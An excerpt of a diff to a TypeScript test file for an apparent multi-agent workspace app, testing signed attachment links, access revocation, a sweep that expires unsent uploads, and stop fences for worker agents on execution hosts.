   it('hands each reader a short-lived signed link beside the public address older apps open, and stores neither link', async () => {
     const { tab, lead } = await fixture()
-    const { attachment, messageId } = await sentFile(tab)
-    const [file] = await read(tab, messageId)
+    // The PM's file in the project's channel, which people and agents read.
+    const { attachment, messageId } = await sentFile(tab, 'hello', lead)
+    const [file] = await read(tab, messageId, owner, undefined, 'lead')
     expect(file!.url).toBe(attachment.url)
     expect(file!.link).toMatch(signed(`super-tabs/${tab}/[0-9a-f]{32}/notes\\.txt`))
     expect(file!.expiresAt! - Date.now()).toBeGreaterThan(4 * 60_000)
@@ -2814,31 +2224,32 @@ describe('Super Tab chat attachments', () => {
     expect(files.open(file!.link!)?.toString()).toBe('hello')
     expect(files.open(file!.link!, file!.expiresAt!)).toBeNull()
     // An agent reads the same way; the stored row keeps only the address.
-    expect((await read(tab, messageId, host, lead))[0]!.link).toMatch(signed(`super-tabs/${tab}/[0-9a-f]{32}/notes\\.txt`))
+    expect((await read(tab, messageId, host, lead, 'lead'))[0]!.link).toMatch(signed(`super-tabs/${tab}/[0-9a-f]{32}/notes\\.txt`))
     const stored = (await db.superTabMessage.findFirst({ where: { id: messageId } }))!.attachments as unknown as Uploaded[]
     expect(Object.keys(stored[0]!).sort()).toEqual(['id', 'mime', 'name', 'size', 'url'])
     // A fresh link opens the same file, for the same time.
-    const again = await fresh(tab, messageId, attachment.id)
+    const again = await fresh(tab, messageId, attachment.id, owner, 'lead')
     expect(again.status).toBe(200)
     expect(again.attachment).toEqual(sameFile(attachment))
     expect(files.open(again.attachment!.link!)?.toString()).toBe('hello')
   })
 
   it('gives a removed member no new link, and a link they kept stops opening within its lifetime', async () => {
-    const { tab } = await fixture()
+    // The PM's file in the project's channel, which the members read.
+    const { tab, lead } = await fixture()
     await invite(tab)
-    const { attachment, messageId } = await sentFile(tab)
-    const [kept] = await read(tab, messageId, peer)
+    const { attachment, messageId } = await sentFile(tab, 'hello', lead)
+    const [kept] = await read(tab, messageId, peer, undefined, 'lead')
     expect(files.open(kept!.link!)?.toString()).toBe('hello')
-    expect((await fresh(tab, messageId, attachment.id, peer)).status).toBe(200)
+    expect((await fresh(tab, messageId, attachment.id, peer, 'lead')).status).toBe(200)
     await attaching.execute(owner, tab, { operationId: randomUUID(), command: { type: 'member.remove', userId: peer.sub } })
-    const refused = await fresh(tab, messageId, attachment.id, peer)
+    const refused = await fresh(tab, messageId, attachment.id, peer, 'lead')
     expect(refused.status).toBe(404)
     expect(refused.body).not.toContain('notes')
     await expect(attaching.messages(peer, tab, 'lead', { messageId })).rejects.toBeTruthy()
     expect(files.open(kept!.link!, kept!.expiresAt!)).toBeNull()
     // Members who still read the chat still open it.
-    expect(files.open((await fresh(tab, messageId, attachment.id)).attachment!.link!)?.toString()).toBe('hello')
+    expect(files.open((await fresh(tab, messageId, attachment.id, owner, 'lead')).attachment!.link!)?.toString()).toBe('hello')
   })
 
   it('gives no link once the Swarm is deleted, though its files wait for the purge', async () => {
@@ -2856,18 +2267,19 @@ describe('Super Tab chat attachments', () => {
   it('answers a file the message does not carry, a message elsewhere or not there, and a hidden row alike', async () => {
     const { tab, lead } = await fixture()
     await invite(tab)
-    const { attachment, messageId } = await sentFile(tab)
-    const other = await sentFile(tab, 'other')
-    const plain = String((await send(tab, [], owner, undefined, 'no file')).result.messageId)
+    // The PM's files and post in the project's channel, which the members read.
+    const { attachment, messageId } = await sentFile(tab, 'hello', lead)
+    const other = await sentFile(tab, 'other', lead)
+    const plain = String((await send(tab, [], host, lead, 'no file')).result.messageId)
     // An agent-only note to the Lead: the person does not read it, so its file is not theirs to open either.
     const { attachment: noted } = await file(tab, 'note.txt', Buffer.from('agent only'), 'text/plain', 'lead', host, lead)
     const hidden = String((await attaching.execute(host, tab, { operationId: randomUUID(), command: { type: 'message.send', conversationId: 'lead',
       text: 'for the lead', replyTo: null, recipientIds: [lead], attachmentIds: [noted.id], agentOnly: true } as Command }, lead)).result.messageId)
     const answers = await Promise.all([
-      fresh(tab, messageId, other.attachment.id, peer),
-      fresh(tab, plain, attachment.id, peer),
-      fresh(tab, 'ffffffffffffffffffffffff', attachment.id, peer),
-      fresh(tab, hidden, noted.id, peer),
+      fresh(tab, messageId, other.attachment.id, peer, 'lead'),
+      fresh(tab, plain, attachment.id, peer, 'lead'),
+      fresh(tab, 'ffffffffffffffffffffffff', attachment.id, peer, 'lead'),
+      fresh(tab, hidden, noted.id, peer, 'lead'),
     ])
     expect(answers.map(a => [a.status, a.body])).toEqual(answers.map(() => [404, answers[0]!.body]))
     expect(answers[0]!.body).toContain('FILE_UNAVAILABLE')
@@ -2883,16 +2295,17 @@ describe('Super Tab chat attachments', () => {
       return sign(key, at)
     })
     try {
-      const { attachment, messageId } = await sentFile(tab)
+      // The PM's file in the project's channel, which people and agents read.
+      const { attachment, messageId } = await sentFile(tab, 'hello', lead)
       expect(attachment).toMatchObject({ unlinked: true })
       expect(attachment.link).toBeUndefined()
-      const [file] = await read(tab, messageId)
+      const [file] = await read(tab, messageId, owner, undefined, 'lead')
       expect(file).toMatchObject({ unlinked: true, url: attachment.url })
-      const refused = await fresh(tab, messageId, attachment.id)
+      const refused = await fresh(tab, messageId, attachment.id, owner, 'lead')
       expect([refused.status, JSON.parse(refused.body).error.code]).toEqual([503, 'FILE_LINK_UNAVAILABLE'])
       expect((await fresh(tab, messageId, attachment.id, host, 'lead', lead)).status).toBe(503)
       failing.mockRestore()
-      const again = await fresh(tab, messageId, attachment.id)
+      const again = await fresh(tab, messageId, attachment.id, owner, 'lead')
       expect(again.status).toBe(200)
       expect(again.attachment!.unlinked).toBeUndefined()
       expect(files.open(again.attachment!.link!)?.toString()).toBe('hello')
@@ -2903,9 +2316,9 @@ describe('Super Tab chat attachments', () => {
     const { tab } = await fixture()
     const { attachment, messageId } = await sentFile(tab)
     const plain = new SuperTabStore(db)
-    const page = await plain.messages(owner, tab, 'lead', { messageId })
+    const page = await plain.messages(owner, tab, await pmChat(tab), { messageId })
     expect((page.messages[0]!.attachments as unknown as Uploaded[]).map(a => [a.name, a.link, a.expiresAt])).toEqual([['notes.txt', undefined, undefined]])
-    await expect(plain.fileLink(owner, tab, 'lead', messageId, attachment.id)).rejects.toMatchObject({ code: 'FILE_UNAVAILABLE' })
+    await expect(plain.fileLink(owner, tab, await pmChat(tab), messageId, attachment.id)).rejects.toMatchObject({ code: 'FILE_UNAVAILABLE' })
   })
 
   it('refuses a viewer before storing anything', async () => {
@@ -2914,6 +2327,214 @@ describe('Super Tab chat attachments', () => {
     const before = files.objects.size
     expect(await file(tab, 'a.png', new Uint8Array(1), 'image/png', 'lead', peer)).toMatchObject({ status: 403, code: 'READ_ONLY' })
     expect(files.objects.size).toBe(before)
+  })
+
+  // Diego, 10-30: uploads nobody sends within a day are removed, row and stored file, so the bucket stops growing.
+  describe('unsent files expire after a day', () => {
+    const HOUR = 3_600_000
+    const pictures = new MemoryAvatarStore('https://avatars.example.test')
+    const bucket = { store: files, prefix: 'super-tabs', publicBase: 'https://cdn.example.test', avatars: pictures, avatarPrefix: 'super-tabs' }
+    // Two a chunk, so a run takes several chunks.
+    const sweep = (database: PrismaClient = db) => sweepUnsentAttachments(database, bucket, new Date(), { chunk: 2, chunks: 5, pauseMs: 0 })
+    const aged = (id: string, hours: number) => db.superTabAttachment.update({ where: { id }, data: { createdAt: new Date(Date.now() - hours * HOUR) } })
+    const row = (id: string) => db.superTabAttachment.findUnique({ where: { id } })
+    const stored = (url: string) => files.objects.has(objectKey(url))
+    // A picture as the avatar route kept one before it was retired (2026-11-09): its object, and its row with the avatar's purpose.
+    // The last such uploads are still swept.
+    const picture = async (tab: string) => {
+      const id = randomBytes(12).toString('hex'), key = `super-tabs/${tab}/${randomBytes(16).toString('hex')}/avatar`
+      await pictures.put(key, { name: 'avatar', mime: 'image/png' }, Readable.from([Buffer.alloc(32)]), 1024)
+      await db.superTabAttachment.create({ data: { id, tabId: tab, conversationId: '', actorKey: `person:${owner.sub}`, name: 'avatar', mime: 'image/png',
+        size: 32, objectKey: key, purpose: AVATAR_PURPOSE } })
+      return { id, key }
+    }
+    // A picture someone wears, as `member.avatar` marked its upload before it was retired.
+    const useAvatar = (id: string) => db.superTabAttachment.update({ where: { id }, data: { usedBy: randomBytes(12).toString('hex') } })
+
+    it('removes a file nobody sent within a day, row and object, and keeps a sent one and a young one', async () => {
+      const { tab } = await fixture()
+      const [old, older, sent, young] = [(await file(tab, 'old.txt')).attachment, (await file(tab, 'older.txt')).attachment,
+        (await file(tab, 'sent.txt')).attachment, (await file(tab, 'young.txt')).attachment]
+      const messageId = String((await send(tab, [sent.id])).result.messageId)
+      const [unusedPicture, usedPicture] = [await picture(tab), await picture(tab)]
+      await useAvatar(usedPicture.id)
+      for (const [id, hours] of [[old.id, 25], [older.id, 48], [sent.id, 25], [young.id, 1], [unusedPicture.id, 25], [usedPicture.id, 25]] as const) await aged(id, hours)
+
+      await sweep()
+      expect([await row(old.id), await row(older.id), stored(old.url), stored(older.url)]).toEqual([null, null, false, false])
+      expect(await row(sent.id)).toMatchObject({ usedBy: messageId })
+      expect(await row(young.id)).toMatchObject({ usedBy: null })
+      expect([stored(sent.url), stored(young.url)]).toEqual([true, true])
+      // The sent message still links its file.
+      expect((await store.messages(owner, tab, await pmChat(tab), {})).messages.find(m => m.id === messageId)?.attachments).toEqual([keptFile(sent)])
+      // Pictures alike: one never used is removed from the avatar store, the one in use stays.
+      expect([await row(unusedPicture.id), pictures.objects.has(unusedPicture.key)]).toEqual([null, false])
+      expect([(await row(usedPicture.id))?.id, pictures.objects.has(usedPicture.key)]).toEqual([usedPicture.id, true])
+      // A young file is still sent as usual.
+      expect((await send(tab, [young.id])).result.messageId).toBeTruthy()
+    })
+
+    it('leaves an upload still on its link, or being removed by its own sweep, to the pending-upload sweep, however old', async () => {
+      const { tab } = await fixture()
+      const [pending, removing] = [(await linkFor(tab, { size: 5 })).upload, (await linkFor(tab, { size: 5 })).upload]
+      for (const link of [pending, removing]) expect(await files.receive(link.url, link.headers, Buffer.alloc(5))).toBe(200)
+      await db.superTabAttachment.update({ where: { id: removing.id }, data: { purpose: REMOVING_UPLOAD_PURPOSE } })
+      for (const id of [pending.id, removing.id]) await aged(id, 25)
+      const keys = [(await row(pending.id))!.objectKey, (await row(removing.id))!.objectKey]
+
+      expect(await sweep()).toEqual({ removed: 0, failed: 0 })
+      expect([(await row(pending.id))?.usedBy, (await row(removing.id))?.usedBy]).toEqual([null, null])
+      expect(keys.map(key => files.objects.has(key))).toEqual([true, true])
+      // Its own sweep takes them, file and row (lib/pendingUploadSweep.ts).
+      expect(await sweepPendingUploads(db, files, Date.now())).toEqual({ removed: 2, failed: 0 })
+      expect(keys.map(key => files.objects.has(key))).toEqual([false, false])
+    })
+
+    it('keeps a file whose object could not be deleted for the next run, and nothing can use it meanwhile', async () => {
+      const { tab } = await fixture()
+      const [stuck, other] = [(await file(tab, 'stuck.txt')).attachment, (await file(tab, 'other.txt')).attachment]
+      const stuckPicture = await picture(tab)
+      for (const id of [stuck.id, other.id, stuckPicture.id]) await aged(id, 25)
+      const failing = new Set([objectKey(stuck.url), stuckPicture.key])
+      const unavailable = async function (this: MemoryAttachmentStore, key: string) {
+        if (failing.has(key)) throw new Error('bucket unavailable')
+        this.objects.delete(key)
+      }
+      const chat = vi.spyOn(files, 'delete').mockImplementation(unavailable)
+      const avatars = vi.spyOn(pictures, 'delete').mockImplementation(unavailable)
+      try {
+        await sweep()
+      } finally {
+        chat.mockRestore()
+        avatars.mockRestore()
+      }
+      expect([await row(other.id), stored(other.url)]).toEqual([null, false])
+      expect([(await row(stuck.id))?.id, stored(stuck.url), (await row(stuckPicture.id))?.id, pictures.objects.has(stuckPicture.key)])
+        .toEqual([stuck.id, true, stuckPicture.id, true])
+      await expect(send(tab, [stuck.id])).rejects.toMatchObject({ code: 'ATTACHMENT_EXPIRED', status: 410 })
+      // Nobody else learns it existed: another member, or its owner from another Swarm, is refused as for an id that never was.
+      await invite(tab)
+      const peers = await ownChat(tab, peer)
+      const never = await send(tab, ['0'.repeat(24)], peer, undefined, '', randomUUID(), peers).catch((error: unknown) => error as { code: string; message: string; status: number })
+      expect(never.code).toBe('ATTACHMENT_UNAVAILABLE')
+      const unknown = { code: never.code, message: never.message, status: never.status }
+      await expect(send(tab, [stuck.id], peer, undefined, '', randomUUID(), peers)).rejects.toMatchObject(unknown)
+      await expect(send((await fixture()).tab, [stuck.id])).rejects.toMatchObject(unknown)
+
+      await sweep()
+      expect([await row(stuck.id), stored(stuck.url), await row(stuckPicture.id), pictures.objects.has(stuckPicture.key)]).toEqual([null, false, null, false])
+    })
+
+    it('logs a failed delete by its code alone, never the stored file\'s address, name or link key', async () => {
+      const { tab } = await fixture()
+      const [offline, refused, odd] = [(await file(tab, 'offline-secret-plan.txt')).attachment, (await file(tab, 'refused-secret-plan.txt')).attachment,
+        (await file(tab, 'odd-secret-plan.txt')).attachment]
+      for (const id of [offline.id, refused.id, odd.id]) await aged(id, 25)
+      const keys = [offline, refused, odd].map(upload => objectKey(upload.url))
+      // As @google-cloud/storage fails: a network error's text is "request to <the object's address> failed" with a
+      // system code, a refused call's text names the object with an HTTP status code; some errors carry neither.
+      const address = (key: string) => `https://storage.googleapis.com/storage/v1/b/attachments/o/${encodeURIComponent(key)}`
+      const errors = new Map<string, Error>([
+        [keys[0], Object.assign(new Error(`request to ${address(keys[0])} failed, reason: socket hang up`), { code: 'ECONNRESET' })],
+        [keys[1], Object.assign(new Error(`Permission denied on attachments/${keys[1]}`), { code: 403 })],
+        [keys[2], new Error(`Could not reach ${address(keys[2])}`)],
+      ])
+      const chat = vi.spyOn(files, 'delete').mockImplementation(async (key: string) => { throw errors.get(key) ?? new Error('unexpected key') })
+      const said: unknown[][] = []
+      const log = { info: (...line: unknown[]) => said.push(line), warn: (...line: unknown[]) => said.push(line) }
+      try {
+        expect(await sweepUnsentAttachments(db, bucket, new Date(), { chunk: 10, chunks: 1, pauseMs: 0, log })).toEqual({ removed: 0, failed: 3 })
+      } finally {
+        chat.mockRestore()
+      }
+      const text = JSON.stringify(said)
+      // Each key is <prefix>/<Swarm>/<link key>/<file name>; the link key alone opens the file on the CDN.
+      const linkKeys = keys.map(key => key.split('/').at(-2)!)
+      expect(linkKeys.every(linkKey => /^[0-9a-f]{32}$/.test(linkKey))).toBe(true)
+      for (const secret of [...keys, ...linkKeys, 'secret-plan', 'storage.googleapis.com', 'socket hang up', 'Permission denied']) expect(text).not.toContain(secret)
+      const line = '[attachment-sweep] could not remove a stored file; its row stays for the next run'
+      expect(said).toEqual(expect.arrayContaining([[line, { attachmentId: offline.id, code: 'ECONNRESET' }], [line, { attachmentId: refused.id, code: '403' }],
+        [line, { attachmentId: odd.id, code: 'unknown' }]]))
+      await sweep()
+      expect([await row(offline.id), await row(refused.id), await row(odd.id)]).toEqual([null, null, null])
+    })
+
+    it('runs a pass as the worker starts it, then hourly, and says once that it is on and what it removed', async () => {
+      const { tab } = await fixture()
+      const stale = (await file(tab, 'stale.txt')).attachment
+      await aged(stale.id, 25)
+      const said: unknown[] = []
+      const stop = startAttachmentSweepFrom(db, () => bucket, { pauseMs: 0, log: { info: (...line: unknown[]) => said.push(line), warn: (...line: unknown[]) => said.push(line) } })
+      try {
+        await vi.waitFor(async () => expect(await row(stale.id)).toBeNull())
+        expect(stored(stale.url)).toBe(false)
+        await vi.waitFor(() => expect(said).toContainEqual(['[attachment-sweep] pass', { removed: 1, failed: 0 }]))
+        expect(said.filter(line => (line as unknown[])[0] === '[attachment-sweep] on')).toEqual([['[attachment-sweep] on', { everyMinutes: 60 }]])
+      } finally {
+        stop()
+      }
+    })
+
+    it('says once when the worker has no bucket, and a settings error turns off only the sweep', async () => {
+      const said: unknown[][] = []
+      const log = { info: (...line: unknown[]) => said.push(['info', ...line]), warn: (...line: unknown[]) => said.push(['warn', ...line]) }
+      const settings = { NODE_ENV: 'production', SUPER_TAB_ATTACHMENTS_BUCKET: '', SUPER_TAB_ATTACHMENTS_CREDENTIALS: '', SUPER_TAB_ATTACHMENTS_PREFIX: 'super-tabs',
+        SUPER_TAB_ATTACHMENTS_PUBLIC_BASE: 'https://cdn.example.test' }
+      startAttachmentSweepFrom(db, () => attachmentsFromEnv(settings), { log })()
+      expect(said).toEqual([['info', '[attachment-sweep] off: no attachments bucket is set (SUPER_TAB_ATTACHMENTS_BUCKET)']])
+      said.length = 0
+      // Settings the API would refuse too: the worker's other jobs still start, and the log says why the sweep did not.
+      const broken = { ...settings, SUPER_TAB_ATTACHMENTS_BUCKET: 'attachments', SUPER_TAB_ATTACHMENTS_PUBLIC_BASE: 'http://cdn.example.test' }
+      expect(() => attachmentsFromEnv(broken)).toThrow()
+      let stop: (() => void) | undefined
+      expect(() => { stop = startAttachmentSweepFrom(db, () => attachmentsFromEnv(broken), { log }) }).not.toThrow()
+      stop!()
+      expect(said).toEqual([['warn', '[attachment-sweep] off: the attachment settings are invalid',
+        { error: 'SUPER_TAB_ATTACHMENTS_PUBLIC_BASE must be an https:// address in production.' }]])
+    })
+
+    it('lets a send racing the sweep either take the file or be refused, never post a message linking a removed file', async () => {
+      const { tab } = await fixture()
+      // The sweep runs inside the send's transaction, after it read the file and just before it takes it. The send's
+      // write then conflicts, and its retry finds the file gone.
+      const late = (await file(tab, 'late.txt')).attachment
+      await aged(late.id, 25)
+      let attempts = 0
+      const racing = new SuperTabStore(new Proxy(db, { get(target, key, receiver) {
+        if (key !== '$transaction') return Reflect.get(target, key, receiver)
+        return (body: (tx: PrismaClient) => Promise<unknown>, options: unknown) => target.$transaction(tx => body(new Proxy(tx, { get(client, name, clientReceiver) {
+          const model = Reflect.get(client, name, clientReceiver)
+          if (name !== 'superTabAttachment') return model
+          return new Proxy(model, { get(delegate, method, delegateReceiver) {
+            const original = Reflect.get(delegate, method, delegateReceiver)
+            if (method !== 'updateMany') return original
+            return async (...args: unknown[]) => { if (!attempts++) await sweep(); return original.apply(delegate, args) }
+          } })
+        } }) as PrismaClient), options as never)
+      } }), Date.now, bucket)
+      await expect(racing.execute(owner, tab, { operationId: randomUUID(), command: { type: 'message.send', conversationId: await pmChat(tab), text: 'late',
+        replyTo: null, recipientIds: [], attachmentIds: [late.id] } })).rejects.toMatchObject({ code: 'ATTACHMENT_UNAVAILABLE' })
+      expect(attempts).toBe(1)
+      expect([await row(late.id), stored(late.url)]).toEqual([null, false])
+      expect((await store.messages(owner, tab, await pmChat(tab), {})).messages.filter(m => m.attachments?.some(a => a.id === late.id))).toEqual([])
+
+      // The send commits after the sweep picked the file, before the sweep's claim: the claim checks again and leaves it.
+      const onTime = (await file(tab, 'on-time.txt')).attachment
+      await aged(onTime.id, 25)
+      let messageId = ''
+      const sentBeforeClaim = new Proxy(db, { get(target, key, receiver) {
+        const original = Reflect.get(target, key, receiver)
+        if (key !== '$runCommandRaw') return original
+        return async (command: Record<string, unknown>) => {
+          if ('update' in command && !messageId) messageId = String((await send(tab, [onTime.id])).result.messageId)
+          return original.call(target, command)
+        }
+      } })
+      await sweep(sentBeforeClaim)
+      expect(messageId).not.toBe('')
+      expect([(await row(onTime.id))?.usedBy, stored(onTime.url)]).toEqual([messageId, true])
+      expect((await store.messages(owner, tab, await pmChat(tab), {})).messages.find(m => m.id === messageId)?.attachments).toEqual([keptFile(onTime)])
+    })
   })
 })
 
@@ -2924,20 +2545,21 @@ it('releases a finished worker through its execution host, cancels deliveries an
   await run(tab, { type: 'machine.contribute', machineId: 'test-host', name: 'Host', cwd: '/repo', engines: ['codex'], maxAgents: 4 }, host)
   const group = (await run(tab, { type: 'conversation.create', title: 'Task', brief: 'Deliver it', checks: [{ description: 'Verified', independent: false }] })).result.conversationId as string
   const native = randomUUID()
-  const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: native, name: 'Worker', configuration: config, lead: false })).result.agentId as string
+  // The machine's own person adds its worker, which then runs in their own account (Swarm v3, task #4120).
+  const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: native, name: 'Worker', configuration: config, lead: false }, host)).result.agentId as string
   const pool = (await poolRows(store, host, 'test-host')).find(p => p.tabId === tab)!.machine
   const oldObservation = { generation: pool.generation,
     resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9, diskFreeBytes: 120e9, diskTotalBytes: 500e9, projectDiskFreeBytes: 120e9, deviceType: 'Laptop', chip: 'Fixture', os: 'macOS', gpuPercent: null },
     quotas: [], tools: {}, runningHarnessIds: [native], stoppedHarnessIds: [] }
   await store.observeMachine(host, tab, 'test-host', oldObservation)
-  const assignmentId = (await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId as string
-  await expect(run(tab, { type: 'agent.release', agentId: worker, decision: 'stop' }, host, lead)).rejects.toMatchObject({ code: 'WORK_ACTIVE' })
+  const assignmentId = (await storeAssignment(db, tab, group, worker)).id
+  await expect(run(tab, { type: 'agent.release', agentId: worker, decision: 'stop' })).rejects.toMatchObject({ code: 'WORK_ACTIVE' })
   await store.stopped(host, tab, assignmentId, 'fixture-native-stop')
   const before = (await store.read(owner, tab)).state
   expect(before.agents.find(a => a.id === worker)!.workDecision).toBe('awaiting')
   const { machineSlots } = await import('../src/superTabs/machines.js')
   expect(machineSlots(before, before.machines![0]!)).toBe(2)
-  await run(tab, { type: 'agent.release', agentId: worker, decision: 'stop' }, host, lead)
+  await run(tab, { type: 'agent.release', agentId: worker, decision: 'stop' })
   expect((await rosterRows(store, host, 'test-host')).find(r => r.agent?.id === worker)).toMatchObject({ stopRequested: true })
   await expect(run(tab, { type: 'agent.remove', agentId: worker }, owner, worker)).rejects.toMatchObject({ code: 'FORBIDDEN' })
   const operation = randomUUID()
@@ -2951,7 +2573,7 @@ it('releases a finished worker through its execution host, cancels deliveries an
   expect(machineSlots(after, after.machines![0]!)).toBe(1)
   await store.observeMachine(host, tab, 'test-host', oldObservation)
   const delayed = (await store.read(owner, tab)).state
-  expect(delayed.machines![0]!.availableSlots).toBe(3)
+  expect(machineSlots(delayed, delayed.machines![0]!)).toBe(1)
   expect(await db.superTabDelivery.count({ where: { tabId: tab, agentId: worker, status: { in: ['queued', 'claimed', 'uncertain'] } } })).toBe(0)
   expect((await rosterRows(store, host, 'test-host')).some(r => r.agent?.id === worker)).toBe(false)
   // Re-contribution reserves a new runtime; ordinary removal must not reuse its old stop proof.
@@ -2962,15 +2584,14 @@ it('releases a finished worker through its execution host, cancels deliveries an
   const reservation = hostPool.reservations.find(r => r.harnessId === native)!
   await store.observeMachine(host, tab, 'test-host', { ...oldObservation, runningHarnessIds: [], stoppedHarnessIds: [native],
     stoppedReservations: [{ harnessId: native, generation: 'old-generation' }] })
-  const stillReserved = (await store.read(owner, tab)).state
-  expect(stillReserved.machines![0]!.availableSlots).toBe(2)
+  // A machine's room is its free memory since saved counts went (2026-11-10): the reservation is read where its host reads it.
+  const reserved = async () => (await poolRows(store, host, 'test-host')).find(p => p.tabId === tab)!.reservations.some(r => r.harnessId === native)
+  expect(await reserved()).toBe(true)
   await store.observeMachine(host, tab, 'test-host', { ...oldObservation, runningHarnessIds: [], stoppedHarnessIds: [native],
     stoppedReservations: [reservation] })
-  const physicallyStopped = (await store.read(owner, tab)).state
-  expect(physicallyStopped.machines![0]!.availableSlots).toBe(3)
+  expect(await reserved()).toBe(false)
   await store.observeMachine(host, tab, 'test-host', oldObservation)
-  const delayedAgain = (await store.read(owner, tab)).state
-  expect(delayedAgain.machines![0]!.availableSlots).toBe(3)
+  expect(await reserved()).toBe(false)
 })
 
 it('fences a shared native session globally while its release is pending', async () => {
@@ -2978,16 +2599,16 @@ it('fences a shared native session globally while its release is pending', async
   const add = async (tab: string) => {
     const group = (await run(tab, { type: 'conversation.create', title: 'Shared worker task', brief: 'Work', checks: [{ description: 'Done', independent: false }] })).result.conversationId as string
     const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: native, name: 'Shared worker', configuration: config, lead: false })).result.agentId as string
-    const assignmentId = (await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId as string
+    const assignmentId = (await storeAssignment(db, tab, group, worker)).id
     return { group, worker, assignmentId }
   }
   const first = await add(a.tab)
   await store.stopped(host, a.tab, first.assignmentId, 'first-finished')
   const second = await add(b.tab)
-  await expect(run(a.tab, { type: 'agent.release', agentId: first.worker, decision: 'stop' }, host, a.lead)).rejects.toMatchObject({ code: 'AGENT_BUSY' })
+  await expect(run(a.tab, { type: 'agent.release', agentId: first.worker, decision: 'stop' })).rejects.toMatchObject({ code: 'AGENT_BUSY' })
   await store.stopped(host, b.tab, second.assignmentId, 'second-finished')
   await run(b.tab, { type: 'agent.remove', agentId: second.worker })
-  await run(a.tab, { type: 'agent.release', agentId: first.worker, decision: 'stop' }, host, a.lead)
+  await run(a.tab, { type: 'agent.release', agentId: first.worker, decision: 'stop' })
   await expect(run(b.tab, { type: 'agent.add', conversationId: second.group, machineId: 'test-host', harnessId: native, name: 'Shared worker', configuration: config, lead: false })).rejects.toMatchObject({ code: 'STOP_REQUESTED' })
   await expect(run(a.tab, { type: 'agent.remove', agentId: first.worker }, host, a.lead)).rejects.toMatchObject({ code: 'FORBIDDEN' })
   const state = (await store.read(owner, a.tab)).state
@@ -2996,13 +2617,34 @@ it('fences a shared native session globally while its release is pending', async
   expect(await db.superTabRun.findUnique({ where: { id: first.worker } })).toBeNull()
 })
 
+it('never refuses other commands for a stopping agent that joins a private chat (Swarm v4 agent chats, 11-09)', async () => {
+  // Swarm v4 gave every agent a private chat while 18 stops waited on hosts that never closed them: every command then marked
+  // those agents confidential, met their stop fence and was refused, people's messages to the PM included, for an hour.
+  const { tab } = await fixture(), native = randomUUID()
+  const group = (await run(tab, { type: 'conversation.create', title: 'Offline worker', brief: 'Work', checks: [{ description: 'Done', independent: false }] })).result.conversationId as string
+  const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: native, name: 'Worker', configuration: config, lead: false })).result.agentId as string
+  const assignmentId = (await storeAssignment(db, tab, group, worker)).id
+  await store.stopped(host, tab, assignmentId, 'completed-before-offline')
+  await run(tab, { type: 'agent.release', agentId: worker, decision: 'stop' })
+  const state = await storedState(tab)
+  state.conversations.push({ ...structuredClone(state.conversations.find(c => c.id === 'lead')!), id: randomUUID(), title: 'Worker',
+    leadId: null, agentIds: [worker], assignment: null, audience: { people: [{ id: owner.sub, generation: state.people.find(p => p.id === owner.sub)!.generation }] } })
+  await saveState(tab, state)
+  await run(tab, await toPm(tab, 'Still there?'))
+  expect((await storedState(tab)).agents.find(a => a.id === worker)!.confidential).toBe(true)
+  // Its stop still holds: the session keeps its stop fence, and a new contribution of it is still refused.
+  expect(await db.superTabRun.findUnique({ where: { id: worker } })).toMatchObject({ assignmentId: expect.stringMatching(/^release-/) })
+  await expect(run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: native, name: 'Again', configuration: config, lead: false }))
+    .rejects.toMatchObject({ code: 'STOP_REQUESTED' })
+})
+
 it('lets a person force-withdraw a stuck stop, clears its fence and retires the old session', async () => {
   const { tab, lead } = await fixture(), native = randomUUID()
   const group = (await run(tab, { type: 'conversation.create', title: 'Offline worker', brief: 'Work', checks: [{ description: 'Done', independent: false }] })).result.conversationId as string
   const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: native, name: 'Worker', configuration: config, lead: false })).result.agentId as string
-  const assignmentId = (await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId as string
+  const assignmentId = (await storeAssignment(db, tab, group, worker)).id
   await store.stopped(host, tab, assignmentId, 'completed-before-offline')
-  await run(tab, { type: 'agent.release', agentId: worker, decision: 'stop' }, host, lead)
+  await run(tab, { type: 'agent.release', agentId: worker, decision: 'stop' })
   const forced = { type: 'agent.remove', agentId: worker } as Command
   await expect(run(tab, forced, host, lead)).rejects.toMatchObject({ code: 'FORBIDDEN' })
   await run(tab, forced)
@@ -3021,10 +2663,10 @@ it('refuses to stop a finished worker that also works in another Swarm', async (
   const first = await fixture(), second = { tab: (await store.create(owner, randomUUID(), 'Other')).id }, native = randomUUID()
   const group = (await run(first.tab, { type: 'conversation.create', title: 'Finished worker', brief: 'Work', checks: [{ description: 'Done', independent: false }] })).result.conversationId as string
   const worker = (await run(first.tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: native, name: 'Worker', configuration: config, lead: false })).result.agentId as string
-  const assignmentId = (await run(first.tab, { type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId as string
+  const assignmentId = (await storeAssignment(db, first.tab, group, worker)).id
   await store.stopped(host, first.tab, assignmentId, 'completed')
   await run(second.tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: native, name: 'Other Builder', configuration: config, lead: false })
-  await expect(run(first.tab, { type: 'agent.release', agentId: worker, decision: 'stop' }, host, first.lead)).rejects.toMatchObject({ code: 'SESSION_SHARED' })
+  await expect(run(first.tab, { type: 'agent.release', agentId: worker, decision: 'stop' })).rejects.toMatchObject({ code: 'SESSION_SHARED' })
   expect((await store.read(owner, first.tab)).state.agents.find(a => a.id === worker)!.workDecision).toBe('awaiting')
 })
 
@@ -3033,9 +2675,9 @@ it('makes a project private while its worker is stopping', async () => {
   const { tab, lead } = await fixture(), native = randomUUID()
   const group = (await run(tab, { type: 'conversation.create', title: 'Finished task', brief: 'Work', checks: [{ description: 'Done', independent: false }] })).result.conversationId as string
   const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: native, name: 'Worker', configuration: config, lead: false })).result.agentId as string
